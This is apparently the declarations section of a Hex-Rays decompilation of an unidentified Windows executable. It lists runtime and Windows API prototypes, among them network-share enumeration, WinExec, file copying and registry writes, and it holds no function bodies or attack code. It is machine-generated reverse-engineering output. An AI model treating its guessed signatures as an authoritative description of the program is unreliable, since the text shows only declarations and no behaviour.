/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileType(HANDLE hFile);
// void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
// void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// BOOL __stdcall SetEndOfFile(HANDLE hFile);
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// LPSTR __stdcall CharNextA(LPCSTR lpsz);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// int __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// LCID __stdcall GetThreadLocale();
// HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// int __stdcall LoadStringA(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// LPSTR __stdcall lstrcpynA(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// int __stdcall lstrlenA(LPCSTR lpString);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BSTR __stdcall SysAllocStringLen(const OLECHAR *strIn, UINT ui);
// INT __stdcall SysReAllocStringLen(BSTR *pbstr, const OLECHAR *psz, unsigned int len);
// void __stdcall SysFreeString(BSTR bstrString);
// UINT __stdcall SysStringLen(BSTR pbstr);
// HRESULT __stdcall VariantClear(VARIANTARG *pvarg);
// HRESULT __stdcall VariantCopyInd(VARIANT *pvarDest, const VARIANTARG *pvargSrc);
// HRESULT __stdcall VariantChangeTypeEx(VARIANTARG *pvargDest, const VARIANTARG *pvarSrc, LCID lcid, USHORT wFlags, VARTYPE vt);
int System::_16453();
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
int System::_16422();
// _DWORD *__usercall sub_4012C8@<eax>(_DWORD *result@<eax>);
// char __usercall System::_16424@<al>(int *a1@<eax>, int *a2@<edx>);
// int *__usercall sub_401300@<eax>(int *result@<eax>);
// char __usercall System::_16426@<al>(int *a1@<eax>, int *a2@<edx>, int *a3@<ecx>);
// int *__usercall System::_16427@<eax>(int *a1@<eax>, int **a2@<edx>);
// char __usercall System::_16428@<al>(int a1@<eax>, int *a2@<edx>);
// char __usercall System::_16429@<al>(LPVOID lpAddress@<ecx>, void *a2@<eax>, int a3@<edx>);
// unsigned int *__usercall System::_16430@<eax>(unsigned int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// LPVOID __usercall System::_16431@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// unsigned int __usercall System::_16432@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
// int __usercall System::_16433@<eax>(int a1@<eax>, int *a2@<edx>);
// int __usercall System::_16434@<eax>(LPVOID lpAddress@<ecx>, void *a2@<eax>, int a3@<edx>);
// char __usercall System::_16435@<al>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>);
char System::_16436();
void System::_16448();
// _DWORD *__usercall System::_16438@<eax>(_DWORD *a1@<eax>);
// int *__usercall System::_16439@<eax>(unsigned int a1@<eax>);
// unsigned int *__usercall System::_16440@<eax>(unsigned int *result@<eax>, int a2@<edx>);
// int __usercall System::_16441@<eax>(int a1@<eax>);
// _DWORD *__usercall System::_16442@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// int __usercall System::_16443@<eax>(int a1@<eax>);
// int __usercall System::_16444@<eax>(int *a1@<eax>);
// int *__usercall System::_16445@<eax>(unsigned int *a1@<eax>, int a2@<edx>);
// int *__usercall System::_16446@<eax>(unsigned int *a1@<eax>, int a2@<edx>);
int System::_16447();
// char __usercall System::_16448_0@<al>(unsigned int *a1@<eax>);
// int __usercall System::_16449_0@<eax>(int a1@<eax>);
// int __usercall System::_16450@<eax>(void *a1@<eax>, int a2@<edx>);
// int __usercall System::_16451@<eax>(int a1@<eax>);
// _DWORD *__usercall System::_16452@<eax>(int a1@<eax>);
// _DWORD *__usercall System::SysGetMem@<eax>(int a1@<eax>);
// int __usercall System::SysFreeMem@<eax>(int a1@<eax>);
// unsigned int __usercall System::_16466@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall System::SysReallocMem@<eax>(int a1@<edx>, BYTE *a2@<eax>);
// int __usercall sub_402598@<eax>(int result@<eax>);
// int __usercall sub_4025B0@<eax>(int result@<eax>);
// void __usercall __linkproc__ ReallocMem(void **a@<eax>, int b@<edx>);
// void __usercall __noreturn System::_16468(char a1@<al>);
void __spoils<ecx> sub_40265C();
// _DWORD *__usercall sub_40267C@<eax>(int a1@<eax>);
int sub_402698();
// int __usercall Move@<eax>(BYTE *a1@<eax>, BYTE *a2@<edx>, int a3@<ecx>);
// BYTE *__usercall System::_16481@<eax>(BYTE *a1@<eax>, BYTE **a2@<edx>);
// void __usercall ParamStr(int a1@<eax>, BYTE **a2@<edx>);
int Randomize();
void __noreturn sub_4027FC(); // weak
// unsigned __int8 __usercall __linkproc__ PStrNCat@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, unsigned __int8 a3@<cl>);
// int __usercall sub_402848@<eax>(char *a1@<eax>, _BYTE *a2@<edx>);
// int __usercall System::__linkproc__ AStrCmp@<eax>(int result@<eax>, int a2@<edx>, unsigned int a3@<ecx>);
// __int16 __usercall sub_4028D4@<ax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_4028F4@<eax>(unsigned int a1@<eax>);
// char __usercall System::__linkproc__ StrLong@<al>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>);
// char __usercall sub_40296C@<al>(int a1@<eax>, _BYTE *a2@<edx>);
// int __usercall System::__linkproc__ ValLong@<eax>(int result@<eax>, char **a2@<edx>);
// _BYTE *__usercall sub_402A44@<eax>(_BYTE *result@<eax>, char *a2@<edx>, char a3@<cl>);
// int __stdcall GetKeyboardType(int nTypeFlag);
int System::_16736();
__int16 System::_16541();
void sub_402B4C();
// int __usercall sub_402B58@<eax>(int a1@<eax>);
// int __usercall sub_402B5C@<eax>(int result@<eax>, void *a2@<edx>);
// _DWORD *__usercall sub_402B70@<eax>(int a1@<eax>);
// int __usercall System::TObject::FreeInstance@<eax>(int a1@<eax>);
// void __usercall TObject_Create(void *TObject_Self@<eax>);
// _DWORD *__usercall sub_402BCC@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_402BDC@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall System::TObject::InitInstance@<eax>(int a1@<eax>, _DWORD *a2@<edx>);
// char __usercall sub_402C40@<al>(int *a1@<eax>, int a2@<edx>);
// int __usercall System::_16563@<eax>(int a1@<eax>, int a2@<ebx>);
// void __usercall sub_402C88(int *a1@<eax>, int a2@<ebx>);
int sub_402CA0();
// int __usercall System::TObject::Dispatch@<eax>(void *a1@<edx>, int *a2@<eax>, int (*a3)(void)@<ebx>);
// int __usercall System::__linkproc__ ClassCreate@<eax>(int result@<eax>, char a2@<dl>, char a3);
// int __usercall sub_402D2C@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_402D34@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_402D3C@<eax>(_DWORD *result@<eax>, char a2@<dl>);
void sub_402D4C();
// void __usercall __spoils<edx,ecx> System::_16583(ULONG_PTR a1@<eax>, ULONG_PTR a2@<edx>);
// void __usercall __spoils<edx,ecx> sub_402D9C(ULONG_PTR a1@<ebx>);
void sub_402DB0();
void __fastcall __spoils<edx,ecx> System::_16588(ULONG_PTR a1, ULONG_PTR a2);
void __fastcall sub_402DF8(int a1, ULONG_PTR a2);
void __spoils<ecx> sub_402E14();
// int __usercall __linkproc__ HandleAnyException@<eax>(EXCEPTION_RECORD *a1@<ebx>, int a2@<ebp>, void *a3@<edi>, ULONG_PTR a4@<esi>, struct _EXCEPTION_POINTERS ExceptionInfo, int a6);
int __cdecl System::__linkproc__ HandleFinally(int a1, ULONG_PTR a2);
void __stdcall sub_402F98(DWORD a1, DWORD a2, DWORD a3, const ULONG_PTR *a4);
int __cdecl System::__linkproc__ RaiseAgain(int a1, int a2);
void __cdecl System::__linkproc__ DoneExcept(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12);
int __stdcall sub_403038(unsigned int a1, int a2, int a3);
// void __usercall __noreturn sub_403050(int a1@<eax>);
void __stdcall __noreturn System::_16600(int *a1);
int __cdecl System::_16601(struct _EXCEPTION_POINTERS ExceptionInfo); // idb
// struct _EXCEPTION_REGISTRATION_RECORD **__usercall sub_403198@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<ebp>);
int System::_16603();
int System::_16604();
int System::_16705();
// int __usercall __linkproc__ StartExe@<eax>(int a1@<eax>, int a2@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *a3@<ebp>);
// void __usercall sub_4032D0(_DWORD *a1@<eax>);
// int __usercall sub_4032EC@<eax>(int *a1@<eax>);
unsigned int System::_16617();
BOOL __stdcall System::_16618(int a1, int a2, int a3);
void __noreturn System::__linkproc__ Halt0();
// void __usercall __noreturn sub_4034B0(int a1@<eax>);
// void __usercall __noreturn sub_4034BC(int a1@<eax>);
void __fastcall System::__linkproc__ LStrClr(LStr *result);
void __fastcall System::__linkproc__ LStrArrayClr(LStr *result, int array_len);
// void __usercall __linkproc__ LStrAsg(char **a@<eax>, char *b@<edx>);
// void __usercall __linkproc__ LStrLAsg(char **a@<eax>, char *b@<edx>);
// int __usercall System::__linkproc__ NewAnsiString@<eax>(int a1@<eax>);
// void __usercall __linkproc__ LStrFromPCharLen(BYTE **a1@<eax>, BYTE *a2@<edx>, int a3@<ecx>);
// void __usercall __linkproc__ LStrFromPWCharLen(int cchWideChar@<ecx>, LPCWSTR lpWideCharStr@<edx>, BYTE **a3@<eax>);
// void __usercall sub_403670(BYTE **a1@<eax>);
// void __usercall __linkproc__ LStrFromPChar_0(BYTE **a1@<eax>, BYTE *a2@<edx>);
// void __usercall __linkproc__ LStrFromPWChar(BYTE **a1@<eax>, int a2@<edx>);
// void __usercall sub_4036EC(BYTE **a1@<eax>, unsigned __int8 *a2@<edx>);
// void __usercall sub_4036F8(BYTE **a1@<eax>, BYTE *a2@<edx>, int a3@<ecx>);
int sub_403710(); // weak
// int __usercall sub_403724@<eax>(int result@<eax>);
// void __usercall System::__linkproc__ LStrCat(BYTE **a1@<eax>, char *a2@<edx>);
// void __usercall System::__linkproc__ LStrCat3(BYTE **a1@<eax>, BYTE *a2@<edx>, char *a3@<ecx>);
// int __usercall System::__linkproc__ LStrCatN@<eax>(char **a1@<eax>, int a2@<edx>);
_DWORD __fastcall System::__linkproc__ LStrCmp(char *str1, char *str2);
// int __usercall sub_4038D8@<eax>(int result@<eax>);
// char *__usercall sub_4038E8@<eax>(char *result@<eax>);
// char *__usercall UniqueString@<eax>(char **a1@<eax>);
// void __usercall __linkproc__ LStrCopy(char *src@<eax>, int index@<edx>, int len@<ecx>, char **dst);
// void __usercall System::__linkproc__ LStrDelete(char **a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall __linkproc__ LStrPos@<eax>(char a@<al>, char *b@<edx>);
// void __usercall System::__linkproc__ LStrSetLength(BYTE **a1@<eax>, int a2@<edx>, LStr *a3@<ecx>);
// _DWORD *__usercall sub_403A60@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// OLECHAR **__usercall sub_403A90@<eax>(OLECHAR **result@<eax>);
// void __usercall System::__linkproc__ WStrArrayClr(OLECHAR **a1@<eax>, int a2@<edx>);
// OLECHAR **__usercall System::__linkproc__ WStrAsg@<eax>(OLECHAR *a1@<edx>, OLECHAR **a2@<eax>);
// char __usercall sub_403AF0@<al>(int a1@<eax>, int a2@<edx>);
// char __usercall System::__linkproc__ InitializeArray@<al>(_DWORD *a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// char __usercall sub_403BB0@<al>(_DWORD *a1@<eax>, char *a2@<edx>);
// int __usercall System::__linkproc__ FinalizeRecord@<eax>(int a1@<eax>, int a2@<edx>);
// OLECHAR **__usercall System::__linkproc__ FinalizeArray@<eax>(OLECHAR **result@<eax>, char *a2@<edx>, int a3@<ecx>);
// OLECHAR **__usercall sub_403CD0@<eax>(OLECHAR **a1@<eax>, char *a2@<edx>);
// int __usercall System::__linkproc__ CopyRecord@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// void __userpurge System::__linkproc__ CopyArray(char **a1@<eax>, char **a2@<edx>, VARIANT *a3@<ecx>, int a4);
// void __usercall System::WideCharLenToStrVar(LPCWSTR lpWideCharStr@<ecx>, int cchWideChar@<edx>, const WCHAR *a3@<eax>);
// int __usercall System::OleStrToStrVar@<eax>(System::AnsiString *a1@<edx>, OLECHAR *a2@<eax>);
// WCHAR *__usercall System::StringToOleStr@<eax>(CHAR *a1@<eax>);
void __noreturn sub_404020();
// void __usercall System::__linkproc__ VarClear(VARIANTARG *pvarg@<ecx>, VARIANTARG *a2@<eax>);
// VARIANT *__usercall System::__linkproc__ VarCopy@<eax>(VARIANT *pvarDest@<ecx>, VARIANTARG *pvargSrc@<edx>, VARIANT *result@<eax>);
// _DWORD *__usercall sub_4040B2@<eax>(_DWORD *result@<eax>, _DWORD *a2@<edx>);
int nullsub_2(void); // weak
// VARIANTARG *__usercall System::_16723@<eax>(VARIANTARG *a1@<ecx>, const void *a2@<edx>, VARIANTARG *a3@<eax>);
// int __usercall sub_40417C@<eax>(VARIANTARG *a1@<ecx>, _WORD *a2@<edx>, VARIANTARG *a3@<eax>);
// VARIANTARG *__usercall System::_16725@<eax>(VARIANTARG *pvarg@<ecx>, VARIANTARG *pvarSrc@<edx>, VARIANTARG *a3@<eax>);
// LONG __usercall Variants::_16474@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>);
// void __usercall Variants::_16476(VARIANTARG *a1@<eax>, int a2@<edx>);
// void __usercall __linkproc__ VarCast(VARIANTARG *vt@<ecx>, VARIANT *a2@<eax>, VARIANTARG *a3@<edx>);
// void __usercall System::__linkproc__ VarToLStr(char **a1@<eax>, VARIANTARG *a2@<edx>);
// void __usercall __spoils<edx,ecx> sub_4043B8(VARIANTARG *a1@<eax>, VARIANTARG *a2@<ecx>);
// VARIANT *__usercall System::__linkproc__ VarAddRef@<eax>(VARIANT *result@<eax>, VARIANT *a2@<ecx>);
// int __usercall sub_4043E4@<eax>(int result@<eax>);
// int __usercall sub_4043EC@<eax>(int a1@<eax>);
// void __userpurge sub_4043F4(char **a1@<eax>, char **a2@<edx>, VARIANT *a3@<ecx>, int a4);
int __fastcall System::__linkproc__ FinalizeArray(_DWORD, _DWORD); // weak
// int *__usercall sub_40440C@<eax>(int *a1@<eax>, int a2@<edx>);
// int *__userpurge System::_16813@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int *a4);
// int *__usercall sub_4045A0@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int *__usercall System::__linkproc__ DynArrayClear@<eax>(int *result@<eax>, int a2@<edx>);
// int *__usercall __linkproc__ DynArrayAsg@<eax>(int *result@<eax>, int a2@<edx>, int a3@<ecx>);
// PVOID __usercall System::FindHInstance@<eax>(const void *a1@<eax>);
// int __usercall System::FindResourceHInstance@<eax>(int result@<eax>);
// const CHAR *__usercall sub_40465C@<eax>(const CHAR *result@<eax>);
// int __usercall System::_16835@<eax>(CHAR *a1@<eax>);
// HMODULE __usercall System::LoadResourceModule@<eax>(const CHAR *a1@<eax>);
// _DWORD *__usercall sub_404A14@<eax>(int a1@<eax>);
// int __usercall sub_404A1C@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_404A24@<eax>(int a1@<eax>);
// int __usercall System::RemoveModuleUnloadProc@<eax>(int result@<eax>);
// int __usercall System::_16845_0@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_404B00@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall System::UnregisterModule@<eax>(_DWORD *a1@<eax>);
// void __usercall System::LoadResString(int a1@<eax>, BYTE **a2@<edx>);
// _DWORD *__usercall sub_404BD8@<eax>(_DWORD *result@<eax>);
// int *__usercall sub_404BF0@<eax>(int *result@<eax>, int a2@<edx>);
// DWORD __stdcall GetCurrentThreadId();
// DWORD __usercall sub_404C14@<eax>(int a1@<eax>);
int sub_404C40();
// DWORD __usercall sub_404C43@<eax>(int a1@<eax>, DWORD a2@<ecx>);
// DWORD __usercall sub_404C70@<eax>(int a1@<eax>);
// DWORD __usercall sub_404C88@<eax>(int a1@<eax>);
// _BYTE *__usercall System::__linkproc__ Assign@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// DWORD __userpurge sub_404EB8@<eax>(int a1@<eax>, void *a2@<edx>, int a3@<ecx>, DWORD *a4);
// DWORD __userpurge sub_404F1C@<eax>(int a1@<eax>, const void *a2@<edx>, int a3@<ecx>, DWORD *a4);
// int __usercall CLOSE@<eax>(int result@<eax>);
// _DWORD *__usercall sub_404FBC@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_404FFE@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_405005@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40500C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
int sub_4050B7();
// _DWORD *__usercall sub_40510D@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_405124@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_40512E@<eax>(int a1@<eax>);
// _DWORD *__usercall WRITEBYTES@<eax>(_DWORD *result@<eax>, char *a2@<edx>, signed int a3@<ecx>);
// _DWORD *__usercall WRITESPACES@<eax>(_DWORD *result@<eax>, signed int a2@<edx>);
// int __usercall sub_40520F@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall System::__linkproc__ Write0CString@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// int __usercall System::__linkproc__ Pow10@<eax>(int result@<eax>);
// int __userpurge System::__linkproc__ _llmul@<eax>(int a1@<eax>, int a2, int a3);
int __cdecl System::Finalization();
int __cdecl System::initialization();
// DWORD __stdcall GetModuleFileNameA_0(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA_0(LPCSTR lpModuleName);
// HLOCAL __stdcall LocalAlloc_0(UINT uFlags, SIZE_T uBytes);
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue);
BOOL sub_4059A0();
LPVOID __linkproc__ GetTls();
_DWORD *SysInit::_16393();
// int __usercall __linkproc__ InitExe@<eax>(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>);
int Finalization_0_7();
void sub_405AE4();
// BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
// LSTATUS __stdcall RegCloseKey_0(HKEY hKey);
// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegFlushKey(HKEY hKey);
// LSTATUS __stdcall RegOpenKeyExA_0(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA_0(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// BOOL __stdcall CloseHandle_0(HANDLE hObject);
// int __stdcall CompareStringA(LCID Locale, DWORD dwCmpFlags, PCNZCH lpString1, int cchCount1, PCNZCH lpString2, int cchCount2);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// HANDLE __stdcall CreateFileA_0(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// void __stdcall DeleteCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// void __stdcall EnterCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall EnumCalendarInfoA(CALINFO_ENUMPROCA lpCalInfoEnumProc, LCID Locale, CALID Calendar, CALTYPE CalType);
// BOOL __stdcall FileTimeToDosDateTime(const FILETIME *lpFileTime, LPWORD lpFatDate, LPWORD lpFatTime);
// BOOL __stdcall FileTimeToLocalFileTime(const FILETIME *lpFileTime, LPFILETIME lpLocalFileTime);
// BOOL __stdcall FindClose_0(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA_0(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// UINT __stdcall GetACP();
// BOOL __stdcall GetCPInfo(UINT CodePage, LPCPINFO lpCPInfo);
// BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
// DWORD __stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// HANDLE __stdcall GetCurrentThread();
// DWORD __stdcall GetCurrentThreadId_0();
// int __stdcall GetDateFormatA(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpDate, LPCSTR lpFormat, LPSTR lpDateStr, int cchDate);
// BOOL __stdcall GetDiskFreeSpaceA(LPCSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters);
// DWORD __stdcall GetLastError_0();
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// int __stdcall GetLocaleInfoA_0(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameA_1(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA_1(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName);
// DWORD __stdcall GetShortPathNameA(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// DWORD __stdcall GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
// LCID __stdcall GetThreadLocale_0();
// DWORD __stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// LANGID __stdcall GetUserDefaultLangID();
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// ATOM __stdcall GlobalAddAtomA(LPCSTR lpString);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// ATOM __stdcall GlobalDeleteAtom(ATOM nAtom);
// ATOM __stdcall GlobalFindAtomA(LPCSTR lpString);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// LPVOID __stdcall GlobalLock(HGLOBAL hMem);
// HGLOBAL __stdcall GlobalHandle(LPCVOID pMem);
// HGLOBAL __stdcall GlobalReAlloc(HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
// BOOL __stdcall GlobalUnlock(HGLOBAL hMem);
// void __stdcall InitializeCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// int __stdcall MulDiv(int nNumber, int nNumerator, int nDenominator);
// BOOL __stdcall ReadFile_0(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall RemoveDirectoryA(LPCSTR lpPathName);
// BOOL __stdcall SetEndOfFile_0(HANDLE hFile);
// BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes);
// DWORD __stdcall SetFilePointer_0(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// BOOL __stdcall SetPriorityClass(HANDLE hProcess, DWORD dwPriorityClass);
// BOOL __stdcall SetThreadPriority(HANDLE hThread, int nPriority);
// void __stdcall Sleep(DWORD dwMilliseconds);
// DWORD __stdcall VerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang);
// SIZE_T __stdcall VirtualQuery_0(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// UINT __stdcall WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
// BOOL __stdcall WriteFile_0(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// DWORD __stdcall WNetEnumResourceA(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
